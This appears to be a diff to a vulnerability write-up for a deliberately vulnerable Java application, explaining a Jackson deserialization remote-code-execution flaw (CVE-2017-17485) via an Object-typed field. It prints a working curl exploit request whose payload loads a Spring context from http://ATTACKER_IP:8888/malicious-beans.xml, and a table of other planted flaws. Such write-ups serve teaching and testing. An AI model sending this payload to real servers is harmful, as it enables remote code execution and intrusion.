@@ -127,12 +127,12 @@ ls -la /tmp/xstream-pwned
 
 ### 3.2 Root Cause
 This vulnerability exists due to two factors:
-1. `BankTransactionEvent.java` uses `@JsonTypeInfo(use = Id.CLASS)` to allow dynamic polymorphic deserialization.
+1. `BankTransactionEvent.java` declares `gatewayExtensionData` as an `Object`-typed field annotated with `@JsonTypeInfo(use = Id.CLASS, property = "@class")`. On `Object`-typed fields, Jackson does **not** enforce subclass hierarchy constraints — it attempts to instantiate whatever class is named in `@class`.
 2. `BankSyncService.java` creates an `ObjectMapper` without `PolymorphicTypeValidator`.
 
-In `jackson-databind` version `2.9.3`, the Spring `ApplicationContext` gadget classes (`org.springframework.context.support.FileSystemXmlApplicationContext` and `ClassPathXmlApplicationContext`) were not yet added to Jackson's internal `SubTypeValidator` blacklist (the blacklist was updated to block these classes starting in version `2.9.3.1`).
+In `jackson-databind` version `2.9.3`, the Spring `ApplicationContext` gadget classes (`org.springframework.context.support.FileSystemXmlApplicationContext` and `ClassPathXmlApplicationContext`) were **not yet added** to Jackson's internal `SubTypeValidator` blacklist. This blacklist was only updated to block these classes starting in version `2.9.3.1` (CVE-2017-17485 patch).
 
-By specifying `org.springframework.context.support.FileSystemXmlApplicationContext` in the `@class` property, Jackson instantiates the bean context using the supplied HTTP XML configuration location, fetching the remote XML definition and executing arbitrary code during instantiation.
+When an attacker sends `gatewayExtensionData` with `@class` pointing to `FileSystemXmlApplicationContext` and a `configLocation` URL, Jackson instantiates that Spring context, fetches the remote XML bean definition over HTTP, and executes the beans — triggering arbitrary code execution during deserialization.
 
 **Why this works on Java 11**: Unlike LDAP/JNDI lookups (which are blocked in Java 11 by `trustURLCodebase=false`), this gadget uses HTTP XML loading via Spring Framework, bypassing JVM JNDI restrictions completely.
 
@@ -168,8 +168,13 @@ Start HTTP server: `python3 -m http.server 8888`
 curl -X POST http://<target>:8080/simipkit/api/sync/bank-feed \
   -H "Content-Type: application/json" \
   -d '{
-    "@class": "org.springframework.context.support.FileSystemXmlApplicationContext",
-    "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
+    "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
+    "bankPartnerCode": "BCA",
+    "referenceNumber": "REF-001",
+    "gatewayExtensionData": {
+      "@class": "org.springframework.context.support.FileSystemXmlApplicationContext",
+      "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
+    }
   }'
 ```
 
@@ -204,7 +209,7 @@ On Java 11, the JVM default setting `com.sun.jndi.ldap.object.trustURLCodebase=f
 |---|---|---|---|---|---|
 | 1 | Zip Slip | CVE-2018-1002202 | 6.5 | Yes | Path traversal entry in ZIP file (`../`) |
 | 2 | XStream Deserialization RCE | CVE-2013-7285 / CVE-2020-26217 | 8.8 | Yes (Admin) | `EventHandler` + `ProcessBuilder` XML proxy |
-| 3 | Jackson Polymorphic RCE | CVE-2017-17485 | 9.8 | **No** | Dynamic reflection of `FileSystemXmlApplicationContext` via HTTP |
+| 3 | Jackson Polymorphic RCE | CVE-2017-17485 | 9.8 | **No** | `FileSystemXmlApplicationContext` gadget via `Object`-typed field `gatewayExtensionData` (not in SubTypeValidator blacklist in 2.9.3) |
 | 4 | Log4Shell Note | CVE-2021-44228 | 10.0 | **No** | Pinned vulnerable Log4j2 dependency note |
 
 ---
